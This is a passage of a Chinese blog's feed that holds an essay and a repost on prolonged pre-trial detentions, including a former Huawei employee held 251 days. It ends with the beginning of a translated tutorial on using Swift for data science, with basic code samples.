src="https://imgs.codewoody.com/uploads/big/5b8a5bd8edde65b8ab8a9d77f29519d4.jpg"></p><p><img src="https://imgs.codewoody.com/uploads/big/79917af689241d7700ee68ab1e120dbd.jpg"></p><p>更多阅读：</p><ul><li><a href="/_posts/2019-11-30-转载-传华为13年老员工离职索要赔偿被关押251天.html">[转载]传华为13年老员工离职索要赔偿被关押251天</a></li><li><a href="https://xueqiu.com/2156146731/136543983" target="_blank" rel="noopener">华为离职员工索要2N赔偿，被告敲诈勒索，羁押251天无罪释放！</a></li></ul><h3 id="潍坊中微孙夕庆1277天">潍坊中微·孙夕庆·1277天</h3><p>近日，历经4年114次庭审，遭羁押1277天的清华海归博士孙夕庆向澎湃新闻表示，11月7日他已拿到了国家赔偿决定书。审理该案的山东潍坊市高新区法院作出决定：向孙夕庆支付人身自由赔偿金和精神损害抚慰金合计54万余元，并为其在侵权行为影响范围内消除影响、恢复名誉、赔礼道歉。</p><p><img src="https://imgs.codewoody.com/uploads/big/1fd36bbdbd670521994f2328dac8d7ae.jpg"></p><p>澎湃新闻此前报道，2003年，在美国工作的清华博士孙夕庆动员7名海外博士回国，并到潍坊创立中微光电子（潍坊）有限公司（以下简称：潍坊中微），孙夕庆担任董事长兼总裁。但他没有想到，自己多年之后会因为这家企业而陷囹圄。</p><p>潍坊中微成立后，曾一度发展很好，成为全球LED灯具市场上发货量最大的制造商之一，是当地的明星企业。</p><p>2014年7月底，潍坊中微发生董事会纠纷，之后孙夕庆被免去董事长和总裁的职务。一个多月后，<strong>公司一名董事</strong>向公安机关举报孙夕庆利用职务便利侵占公司财产。很快，孙夕庆被公安机关刑事拘留。</p><p>2015年11月，孙夕庆被当地检方提起公诉，被指控的罪名为<strong>虚开增值税发票罪和职务侵占罪</strong>。法庭上，孙夕庆坚称自己无罪，同时认为自己是遭到构陷。</p><p>此案经过一审判决，之后发回重审。庭审笔录显示，这个案件<strong>4年来经历114次庭审</strong>。</p><p>2019年5月9日，潍坊市高新区法院对该案作出刑事裁定书。裁定书显示，当天，开发区检察院以证据发生变化为由，向法院申请撤回对被告单位潍坊中微、被告人孙夕庆，及该案另一被告人乐成文的起诉。</p><p>8月12日下午，潍坊市高新区检察院检察官向孙夕庆宣读了《不起诉决定书》。决定书中称：“经本院审查并退回补充侦查，本院仍然认为潍坊市公安局高新技术产业开发区分局认定的犯罪事实不清、证据不足，不符合起诉条件。”</p><p>随后，孙夕庆提出了2.06亿元国家赔偿申请。10月18日，潍坊高新区法院作出《国家赔偿决定书》。</p><p>决定书显示，孙夕庆从2015年2月3日被刑事拘留至2018年8月2日被采取取保候审强制措施，共被羁押1277天。重审过程中，高新区检察院撤回对孙夕庆起诉并作出不起诉决定，属于发回重审后作无罪处理的情形。依照相关法律和司法解释的规定，孙夕庆有权向法院申请获得国家赔偿。</p><p>决定书中称，赔偿请求人孙夕庆被判决有罪后在重审期间按无罪处理，法院作为赔偿义务机关应依法赔偿孙夕庆支付被羁押1277天期间的人身自由赔偿金，计403455.38元（315.94元/天×1277天）。</p><p>“赔偿请求人孙夕庆因长期被羁押，精神受到损害，且因其被判决有罪，日常生活受到较大影响，社会评价降低，应当认定其精神受到损害且造成严重后果。”决定书中称，法院作为赔偿义务机关应当在侵权行为影响范围内为其消除影响，恢复名誉，赔礼道歉，并支付<strong>精神损害抚慰金141000元</strong>。</p><p>对于孙夕庆主张的刑事案件律师代理费、交通费及家属误工费，以及其主张的因其被羁押致公司业务停顿，其本人持有公司股票价值损失等，高新区法院认为不符合财产权受到损害应予赔偿的情形，驳回了其请求。</p><p>更多阅读：</p><ul><li><a href="https://new.qq.com/omn/20191111/20191111A0BAOQ00.html" target="_blank" rel="noopener">清华海归博士被羁押1277天后检方撤诉 获54万国家赔偿</a></li><li><a href="https://www.zhihu.com/question/355293085/answer/916340624" target="_blank" rel="noopener">如何看待清华海归博士孙夕庆被羁押 1277 天后检方撤诉，获 54 万国家赔偿一事？</a></li></ul><h3 id="李宁超过4年至今未放">李宁·超过4年至今未放</h3><p>2019年6月24日有媒体报道说，中国工程院院士沈国舫致信媒体表示，中国工程院院士李宁自2014年6月20日以涉嫌贪污公款罪被羁押以来，在超过4年的时间里仍未被法院宣判，“我们很多院士都认为很是不妥”。</p><p>最近一些年，在科研经费问题上，许多科研人员、其中有些是学科带头人乃至国际知名专家都纷纷栽了跟头。李宁正是在此问题“栽”进去的又一典型案例。李宁案发当初，有报道称“包括李宁在内的7名教授，弄虚作假套取国家科技重大专项资金涉嫌2500多万元”。在李宁被捕4年多期间内，该案分别于2014年12月23日、2015年1月26日两次移送吉林省松原市检察院审查起诉，在2015年8月20日、21日于松原市中级法院开庭审理后，近3年时间里，此案再无任何下文。</p><iframe src="//player.bilibili.com/player.html?aid=65045875&amp;cid=112901287&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe><ul><li><a href="https://guancha.gmw.cn/2018-06/25/content_29447959.htm" target="_blank" rel="noopener">院士遭羁押超4年，审而不判不正常</a></li><li><a href="http://finance.sina.com.cn/china/20150312/043421701901.shtml" target="_blank" rel="noopener">令狐安:不追究“逼良为娼”的科研经费报销问题</a></li></ul><h2 id="后人哀之而不鉴之">后人哀之而不鉴之</h2><p>上面这些案子，肯定只是冰山一角。近年来因为维权被诬为诈骗，或者在国家漏洞百出的科研经费管理体系中被人抓辫子等等案例中，其实诬告本身不可怕，因为毕竟上面这些案子，多数最终还是还了受害者一个清白。但是这些案子的可怕之处在于，我们的司法机关可以在没有任何实质证据的情况下，以司法程序中的漏洞，将任何人羁押任意长的时间。至于我们的取保候审制度，什么时候该取保，什么时候不该取保，毫无规则，基本上司法机关说怎么办，那就怎么办。</p><p>事实上，在国内法律上并没有严格意义上的「取保候审」制度，所谓把人从公安机关处保释出来，无从谈起。然而，《刑事诉讼法》第六十四条规定，人民法院、人民检察院和公安机关根据案件情况，对犯罪嫌疑人、被告人可以拘传、取保候审或者监视居住。在法律效果上，取保候审与保释差不多。</p><p>关于取保候审的适用比例，官方没有公布过数据。实务中，犯罪嫌疑人、犯罪嫌疑人近亲属或辩护律师向办案机关提出的取保候审申请，绝大多数都是石投大海，杳无音讯。实务中，公安机关将案件呈送检察院提请批准逮捕，检察院经审查，认为案件证据不足或不构成犯罪，不批准公安机关的呈捕申请的，公安机关才会迫不得已，将刑事拘留变更为取保候审。可以说，在当前的中国，取保候审难，难于上青天。在当前的中国，逮捕是原则，取保候审是例外。</p><h3 id="法律面前人人平等吗">法律面前人人平等吗</h3><p>其实，法律条款本身严苛与否，与法律是否公平其实是两回事。但问题在，如果李洪元去告任正非，咱们的公安机关会把任正非羁押251天吗？能羁押一天就算我输。因此我们不得不常常去怀疑司法系统有些人的动机。尽管法律规定过于严苛，存在很多漏洞，但是这些司法人员，想必也不是为了照本宣科地维护法律的字面公义吧。企业动用各种政府关系施压司法机关，司法机关做出这种骚操作的链条，实在是屡见不鲜了。</p><h3 id="既是运动员也是裁判员">既是运动员也是裁判员</h3><p>如果只是说司法机关收到来自外部的压力不得不做这些见不得人的交易，尚且情有可原。但其实很多时候在没有外部压力的情况下司法机关也会做出匪夷所思的操作。为什么呢？这其实是因为中国一个非常常见的现象：有些部门既当运动员，又当裁判员，人家怎么会自己判自己犯规呢？决定拘留人的，是公安机关，决定释放人的，也是公安机关，这不是变相要求公安机关承认自己办错案了吗?反正人被刑事拘留后，被证明没有犯罪事实或因证据不足没有批捕，最终被释放的，公安机关也不算是办错案，不用承担法律责任，不用国家赔偿，为什么要释放呢?</p><p>这就会出现一种极其离奇的现象，就是公安机关拘留某人后，发现其极其可能没有犯罪事实的，依然继续羁押，而不是主动将其释放，等到拘留期即将届满了，公安机关就将该案呈送检察院提请批准逮捕，将这个烫手山芋抛给检察院，如果检察院不批准逮捕的话，就放人;如果检察院批准逮捕的话，就将强制措施变更为逮捕。当然到检察院这里，检察院也不想担责任啊！</p><p>既是运动员也是裁判员的滑稽之处就在于：一方面它违反人的自利天性；另一方面它造成责任不明确的现象，多个机关负责就意味着没有人负责。</p><p>既是运动员也是裁判员的现象并不罕见。我一直关注学术不端的各种新闻，中国清查学术不端的体系也是这种既是运动员也是裁判员的体系。教授出成果了各种宣传表彰的是高校，如果出了学术不端的案子，负责查的也是高校，这不是逼着高校自己打自己的脸么？</p><h3 id="学会保护自己">学会保护自己</h3><p>其实面对这种腐败的体系的时候，普通人一旦成为主角，实在是毫无办法。面临这种无理由的羁押，在现行法律体系下，人家还真不违法。所以李宁教授被关了四年多还不放出来，就算各方关注，就算众多院士发布公告，也毫无作用。对于那些官僚来说，舆论就算闹到天上，这事不用他们承担什么责任。反之，如果他们放人，就等于承认自己之前的羁押是错误的，到时候就有人要承担责任了吧？也许这种事情只能等相关的胥吏退休或者升职了，换上新人来操作了，才有转圜的空间。</p><p>不过好处是，这种司法乱象还只是他们陈腐僵化的体系的一种被动反应，不至于主动伪造证据，强行判处成有罪（这样做不但没有直接的好处如果日后平反还要担责任），所以大家在和任何人打交道的时候，尤其是涉及比较多金钱的时候一定要留足证据。国家补偿虽然不多，但是好歹比坐牢强多了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近期华为一位工程师在获取离职赔偿之后被公司诬告，导致他被羁押了251天的事情再次带来了社会舆论对于技术人才遭遇的这种司法不公的关注。似乎在这种问题上，我国的取保候审制度似乎就成了摆设。&lt;/p&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://www.codewoody.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>[转载]传华为13年老员工离职索要赔偿被关押251天</title>
    <link href="http://www.codewoody.com/posts/38296/"/>
    <id>http://www.codewoody.com/posts/38296/</id>
    <published>2019-11-30T11:37:18.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文转载自：<a href="https://www.williamlong.info/archives/5902.html" target="_blank" rel="noopener">https://www.williamlong.info/archives/5902.html</a></p></blockquote><p>11月28日一份刑事赔偿决定书在网上流传，一位华为离职员工李洪元索要2N赔偿之后，被华为控告敲诈勒索，于2018年12月16日被拘留，法院认定犯罪事实不清，证据不足，不符合起诉条件，关押251天后李洪元重回自由。</p><p>在法院的宣判文中，深圳龙岗法院表示：深圳市公安局移送审查起诉的犯罪嫌疑人李洪元涉嫌敲诈勒索罪一案退回公安机关第二次补充侦查。深圳市公安局于7月10日提交了《补充侦查报告》，反映了其在与李洪元商谈离职补偿问题时，李洪元根本不存在敲诈勒索的行为。为此，鉴于李洪元的行为根本不构成犯罪或者依法不应追究刑事责任的实际情况，依照《刑事诉讼法》第一百七十三条第一款及第一百七十一条第四款之规定，对华为该员工作出法定不起诉的决定。</p><p>经本院审查并通过补充侦查，仍然认为深圳市公安局认定的犯罪事实不清，证据不足，不符合起诉条件。于2019年8月22日决定对李洪元不起诉。对赔偿请求人李洪元予以国家赔偿，包括人身自由损害赔偿金79300.94元，精神损害抚慰金27755元，两项合计107522. 94元。向李洪元原工作单位、其父亲李洪元所在的工作单位发函、为其消除影响、恢复名誉。</p><p>从宣判文中可见：</p><ol type="1"><li>李洪元2005年入职华为担任工程师，离职前在逆变器销售管理部工作，2018年1月31日离职，在华为工作13年之久，主动离职与辞退离职尚未知晓。</li><li>离职过程中，因为补偿金额发生争议，商议后补偿33万元左右。</li><li>2018年3月8日，李洪元离职近40天后，华为向其转款补偿金，注意是通过私人账号，同时备注转款原因离职经济补偿。</li></ol><p>前边的一系列流程都很正常，离职然后补偿，但华为的HR并没有停手，他们起诉李洪元敲诈勒索，于2018年12月16日被拘留，幸亏人民法院认定犯罪事实不清，证据不足，认定不符合起诉条件，关押251天后李洪元重回自由。</p><p>以下为不起诉意向书（部分）内容：</p><p>2018年12月15日，华为公司委托法务人员袁x到深圳市公安局经侦支队八大队报案称：公司员工李xx与杨x等人勾结，在与公司的离职补偿劳动纠纷中，威胁将资料外泄披露，要求公司给予补偿。在公安机关以侵犯商业秘密立案而查证无果的情况下，华为公司改变策略，于2018年12月28日以涉嫌敲诈勒索再次报案，控告李xx于2018年1月31日与部门领导何xx洽谈离职补偿过程中，采用威胁和强制的方式，迫使该员工何xx同意私下给付额外补偿金33万元，以换取他不闹事，不举报，顺利离职的承诺。</p><p>本案中，华为公司相关工作人员何xx、李x、袁x、周x作为证人，分别多次接受了公安机关的询问，并制作了询问笔录。所有这些证人均口径一致的指证李xx在与何xx商谈离职补偿时，采用了威胁和强制的方式，逼迫何xx给予额外的2N补偿，最后何xx考虑到李xx的危险性，不得不作出让步。好在该员工李xx保存了当时与何xx商谈离职补偿时的录音资料，通过该录音资料能够反证何xx等人是在说谎，不能排除有恶意构陷李xx之嫌。辩护人觉得事态严重，迅速向贵院出具了法律意见书，要求人民检察院将本案退回补充侦查。</p><p>公安机关在第一次补充侦查阶段，提交了将查扣的李xx的两部手机、一台笔记本电脑、一个录音笔、一个u盘、一个移动硬盘设备内的电子数据委托广东安证计算机司法鉴定所进行司法鉴定后，该所出具的《司法鉴定意见书》及录音资料文字版。能够证明当时的商谈是在双方有说有笑的基础上进行的，最终经过2小时12分24秒的充分协商，达成了离职补偿协议，整个过程并无李xx实施威胁或要挟的语言，反倒是何xx与袁x反复强调该协议内容合法，要求该员工李xx尽快接受协议约定的内容并迅速签字，足以证明李xx在与何xx商谈离职补偿的时候没有采用敲诈勒索的方式，何xx等人的证言称何xx在与李xx商谈离职补偿时受到李洪元敲诈勒索没有事实根据。</p><p>公安机关在第二次补充侦查过程中，再一次对何xx进行了询问，并附上了对何xx的询问笔录。可能这次是何xx良心发现，推翻了原来的证言，并如实陈述了自己与李xx仅仅只是2018年1月31日下午接触过一次，且在这次商谈过程中，李xx并没有对其实施要挟和威胁行为。该陈述与公安机关第一次补充侦查阶段提供的2019年5月13日华为公司逆变器管理部HRBP吕辉平出具的《关于李xx工作调整和合同不续签的两次正式沟通说明》内容相印证。吕xx在说明中称，自己协助主管熊x与该员工进行了两次沟通，第一次是在2017年7月底指出该员工业务不足以及工作调整，下半年工作重点和输出等，并提供机会给他工作调整；第二次是2017年12月份，作出不续签合同的正式沟通，安排工作交接和要求，整个沟通过程平和，李表示了解公司离职政策，并没有跟沟通主管和吕xx提特殊要求。由此可见，李xx在2018年1月31日与何xx商谈离职补偿之前，没有采用任何过激的语言，当获知公司不续签劳动合同的消息后，也能够保持理智，并没有提出任何特殊要求；接着在与何xx商谈离职补偿的过程中，更没有对何xx实施要挟和威胁的方式。那么，本案所谓敲诈勒索罪依法不能成立。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;原文转载自：&lt;a href=&quot;https://www.williamlong.info/archives/5902.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.williamlong.info/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【翻译】使用Swift语言来进行数据科学研究的指南</title>
    <link href="http://www.codewoody.com/posts/37730/"/>
    <id>http://www.codewoody.com/posts/37730/</id>
    <published>2019-11-29T15:06:56.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Swift是苹果公司研发的用来取代Objective C进行苹果生态系统下软件开发的语言。而且苹果对于Swift的野心不至于一款APP专用的开发语言而已。 从Swfit语言发布以来，苹果公司就将Swift开源，并且在Swift版本迭代过程中积极听取来自普通开发者的意见。苹果致力于将Swift打造成跨平台的 通用变成语言。我从Swfit发布起就开始使用了，当时接触Swift的时候就为其所吸引，其引入的很多特性，如Type Interference， Optional，以及 简洁的语言形式等等，都能搞大大提高生产效率，并且提高程序的可读性。</p><p>现在我已经不怎么做iOS的开发的，用Swift也偏少。这两天突然看到了一篇名为<a href="https://www.analyticsvidhya.com/blog/2019/10/comprehensive-guide-learn-swift-from-scratch-data-science/" target="_blank" rel="noopener">A Comprehensive Guide to Learn Swift from Scratch for Data Science</a>的文章，便想立刻通读一遍，也许在之后我可以多用Swift来做研究方面的内容。</p></blockquote><h2 id="overview">Overview</h2><ul><li>Swift很快就成为了最为强大和有效的数据科学变成语言之一；</li><li>Swift和Python比较类似，因此你可以很容易地迁移到Swift上；</li><li>这里我们将会涉及Swift的基础知识，并学会如何快速搭建第一个数据科学模型；</li></ul><h2 id="简介">简介</h2><p>Python在数据科学的领域的火热程度自然不用多少，各种各样的排名和调查都将Python列为数据科学编程语言的佼佼者。</p><blockquote><p>Python本身是非常灵活的，作为动态语言，你在使用Python不太需要遵守很多变成方面的潜规则，这带来很大的灵活性。不过这导致随着项目复杂度的增长，维护Python项目会变得比较困难。当然，性能也是一个重要的因素。一般脚本级别的数据科学应用，Python的性能并不突出，Python一般被用来当做胶水语言，主要的计算一般是其他语言实现的模块来完成。不过复杂项目中Python的性能还是会成为一个瓶颈。</p></blockquote><p>不过要记住的一点是，数据科学是一个含义广泛且不断演化的学科。因此其使用的语言也要不断演化。还记得R语言在数据科学中扮演老大角色的日子吗？与Python同时兴起的还有Julia语言。</p><p>没错，这里我们就要来讨论一下将Swift语言应用到数据科学中。</p><p><img src="https://imgs.codewoody.com/uploads/big/b5e001b9f8a4d9dafcd5ec496a58de85.jpg"></p><blockquote><p>“I always hope that when I start looking at a new language, there will be some mind-opening new ideas to find, and Swift definitely doesn’t disappoint. Swift tries to be expressive, flexible, concise, safe, easy to use, and fast. Most languages compromise significantly in at least one of these areas.” – Jeremy Howard</p></blockquote><p>当<a href="https://en.wikipedia.org/wiki/Jeremy_Howard_(entrepreneur)" target="_blank" rel="noopener">Jeremy Howard</a>【~Howard was the President and Chief Scientist at Kaggle】为一个语言背书，且将这门语言应用到他的日常数据科学研究中时，你就应该暂时停止你手上的工作好好听一听了。</p><p>在这这篇文章中我们将学习Swift编程语言，以及如何将其应用到数据科学领域中【~原作者真啰嗦】。如果你是Python用户，你会发现Swift和Python之间有很多的相似性。</p><h2 id="why-swift">Why Swift?</h2><blockquote><i>“PyTorch was created to overcome the gaps in Tensorflow. FastAI was built to fill gaps in tooling for PyTorch. But now we’re hitting the limits of Python, and Swift has the potential to bridge this gap” </i><p style="text-align: right"><i>– Jeremy Howard</i></p></blockquote><p>今年来数据科学领域对于Swift的兴趣日渐增长，几乎人人都在讨论这个话题。以下是你要学习Swfit语言的几个原因：</p><ul><li>Swift很快，几乎接近C语言的水平；</li><li>与此同时，Swift语言非常简洁，可读性很高。这和Python类似。【~个人认为Swift的可读性可比Python高多了】；</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyModel</span>: <span class="title">Layer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> conv = <span class="type">Conv2D</span>&lt;<span class="type">Float</span>&gt;(filterShaper: (<span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">  <span class="keyword">var</span> pool = <span class="type">MaxPool2D</span>&lt;<span class="type">Float</span>&gt;(<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">var</span> flatten = <span class="type">Flatten</span>&lt;<span class="type">Float</span>&gt;()</span><br><span class="line">  <span class="keyword">var</span> dense = <span class="type">Dense</span>&lt;<span class="type">Float</span>&gt;(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">  </span><br><span class="line">  @differentiable</span><br><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">call</span><span class="params">(<span class="number">_</span> input: Tensor&lt;Float&gt;)</span></span> -&gt; <span class="type">Tensor</span>&lt;<span class="type">Float</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> dense(flatten(pool(conv(input))))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyModel</span><span class="params">(nn.Model)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">    super().__init__()</span><br><span class="line">    self.conv = nn.Conv2d(<span class="number">3</span>, <span class="number">6</span>, kernal_size=<span class="number">5</span>)</span><br><span class="line">    self.pool = nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">    self.flatten = Flatten()</span><br><span class="line">    self.dense = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, input)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.dense(self.flatten(self.pool(self.conv(input))))</span><br></pre></td></tr></table></figure><ul><li>相比于Python，Swift是一门更高效，稳定，安全的编程的语言；</li><li>Swift更适合应用到移动应用场景。Swift是iOS的官方变成语言；</li><li>Swift对于自动微分操作支持非常好，因此非常适合数值计算【~参见上面的@differentiable】；</li><li>Swift背后有Google，Apple和FastAI的支持</li></ul><p>下面这个视频是Jeremy Howard谈论Swift的优势的视频。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/drSpCwDFwnM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="swift-basic-for-data-analysis">Swift Basic for Data Analysis</h2><p>在我们开始将Swift应用于数据科学研究之前，我们先来学习一下Swift语言的基础只是。</p><h3 id="swift生态">Swift生态</h3><p>目前Swift的数据科学应用生态主要由两个生态系统组成：</p><ol type="1"><li>开源生态</li><li>苹果生态</li></ol><p><img src="https://imgs.codewoody.com/uploads/big/8f315354975c79b64987964329b23705.png"></p><p>在开源生态系统中，我们可以在任何操作系统下载并运行swift。我们可以使用一些非常酷的Swift库来构建机器学习应用，例如Swift for Tensorflow, SwiftAI以及SwiftPlot.</p><p>Swift也能让我们无缝地从Python中引入成熟的数据科学库，例如Numpy, pandas, matplotlib以及scikit-learn。所以如果你之前还在担心从Python迁移到Swift上有任何无法逾越的障碍的话，现在你可以宽心了。</p><p>另一方面，苹果公司的生态系统也有其优势。苹果公司提供了一些有用的库，如CoreML，让我们能够在Python中训练大型的模型并且直接导入到Swift中应用。另外，其中还包括了一些已经提前训练好了的成熟模型，我们可以直接在iOS和macOS应用中使用。</p><p><img src="https://imgs.codewoody.com/uploads/big/36f6165e5e466fe6807e0f869064b38c.png"></p><p>还有一些其他的有意思的库，比如Swift-CoreML-Transformers，可以让我们在iPhone上使用业界最新的文字生成模型，例如GPT-2, BERT等。</p><blockquote><p><i>There are multiple differences between the two ecosystems. But the most important one is that in order to use the Apple ecosystem, you need to have an Apple machine to work on and you can only build for Apple devices like the iOS, macOS etc.</i></p></blockquote><p>现在你对Swift有了一个宏观的了解了，下面我们来走进代码。</p><h3 id="准备swift环境">准备Swift环境</h3><p>在Google Colab【~Colaboratory 是一个免费的 Jupyter 笔记本环境，不需要进行任何设置就可以使用，并且完全在云端运行】上提供了支持GPU和TPU的Swift版本，这里我们直接使用这一服务，从而省去安装过程。</p><p><img src="https://imgs.codewoody.com/uploads/big/451eba98fbef8b87bf2473971390e66f.png" alt style="width: 60%"></p><p>你可以遵循下面的步骤创建一个启用了Colab notebook。</p><ol type="1"><li>打开一个<a href="https://www.analyticsvidhya.com/blog/2019/10/comprehensive-guide-learn-swift-from-scratch-data-science/" target="_blank" rel="noopener">空白的Swift notebook</a>;</li><li>点击"File"，然后选择"Save a copy in Drive" - 这会将Swift notebook保存到你的Google Drive里面。</li><li>到这里我们就可以在Colab里面使用Swift了。我们来写下第一行代码：</li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"hello world from Swift"</span>)</span><br></pre></td></tr></table></figure><p>这就是Swift的hello world程序了！接下来如果你想在本地运行Swift，你可以按照如下的链接进行操作：</p><ol type="1"><li>Swift安装指南：<a href="https://www.analyticsvidhya.com/blog/2019/10/comprehensive-guide-learn-swift-from-scratch-data-science/" target="_blank" rel="noopener">install instructions</a>；</li><li>要在Ubuntu中安装Jupyter Notebook：[Jeremy Howard's instructions to install Swift]；</li><li>在Ubuntu上也可以使用Docker来安装Swift：<a href="https://github.com/apple/swift-docker" target="_blank" rel="noopener">Swift for Docker</a></li></ol><blockquote><p>如果在macOS下面，直接从应用商店安装xcode就行，可以创建一个Swift Playground来试试Swift语言的特性。我记得iPad上也有Swift Playground的应用。</p></blockquote><p>接下来让我们快速过一下Swift的基本语言特性。</p><h3 id="the-print-function">The Print function</h3><p>hello world程序中，<code>print</code>函数的形式一点都不陌生啦。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Swift is easy to learn!"</span>)</span><br></pre></td></tr></table></figure><h3 id="variable-in-swift">Variable in Swift</h3><p>Swift提供了两个创建变量的选项：<code>let</code>和<code>var</code>。其中<code>let</code>被用来创建常量，常量的值在其声明周期中是不能被改变的。<code>var</code>用来创建变量，这意味着类似在Python里一样，你可以修改变量的值。</p><p>我们来看下面的例子。创建两个变量：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">"Analytics"</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="string">"Vidhya"</span></span><br></pre></td></tr></table></figure><p>让我们来尝试修改其值：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">"AV"</span></span><br><span class="line">a = <span class="string">"AV"</span></span><br></pre></td></tr></table></figure><p>我们可以看到修改a的值时会出现错误：</p><figure><img src="https://imgs.codewoody.com/uploads/big/38eccdfe56ca3db57c311b890bf47df7.png" alt><figcaption>Colab上的截图</figcaption></figure><p>这种支持创建<strong>常量</strong>的能力可以帮助我们消除很多潜在bug。后面你可以看到我们会用<code>let</code>来创建那些非常重要且我们不希望修改的值。例如训练数据和结果我们会用<code>let</code>来创建，而一些临时变量会使用<code>var</code>来创建。</p><p>Swift的另一个很酷的特性是你可以使用emoji来作为变量名【~其实就是对Unicode的支持】</p><p><img src="https://imgs.codewoody.com/uploads/big/a7703331c5c85017c96ec42db8c30ac3.png"></p><p>我们也可以使用希腊字母来作为变量名称:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> π = <span class="number">3.1415925</span></span><br></pre></td></tr></table></figure><h3 id="swift数据类型">Swift数据类型</h3><p>Swift支持一些通用的类型，如整型，字符串，单精度浮点数(Float)和双精度浮点数(Double)。在创建变量时，Swift会根据初始化值自动推断变量的类型。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> marks = <span class="number">63</span></span><br><span class="line"><span class="keyword">let</span> percentage = <span class="number">70.0</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">"Sushil"</span></span><br></pre></td></tr></table></figure><p>在创建变量时你也可以显式的声明变量类型。如果初始化值和声明的类型不同，Swift会抛出错误。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> weight: <span class="type">Double</span> = <span class="number">62.8</span></span><br></pre></td></tr></table></figure><p>字符串格式化的方式在Swift中非常简洁。只需要用反斜杠<code>\</code>后面跟上括号就可以了：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> no_of_apples = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"I have \(no_of_apples) apples"</span>)</span><br></pre></td></tr></table></figure><p>你可以使用连续的三个双引号<code>"""</code>来创建多行字符串。</p><h3 id="列表和字典list-and-dictionaries">列表和字典(List and Dictionaries)</h3><p>如同Python里面一样，Swift里面也支持List和Dictionary数据结构。不同于Python，在Swift中这两种类型都使用方括号<code>[]</code>。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shoppingList = [<span class="string">"catfish"</span>, <span class="string">"water"</span>, <span class="string">"tulip"</span>, <span class="string">"blue paint"</span>]</span><br><span class="line">shoppingList[<span class="number">1</span>] = <span class="string">"bottle of water"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> occupationsDist = [</span><br><span class="line">  <span class="string">"Malcolm"</span>: <span class="string">"Caption"</span>,</span><br><span class="line">  <span class="string">"Kaylee"</span>: <span class="string">"Mechanic"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ccupationsDict[<span class="string">"Jayne"</span>] = <span class="string">"Public 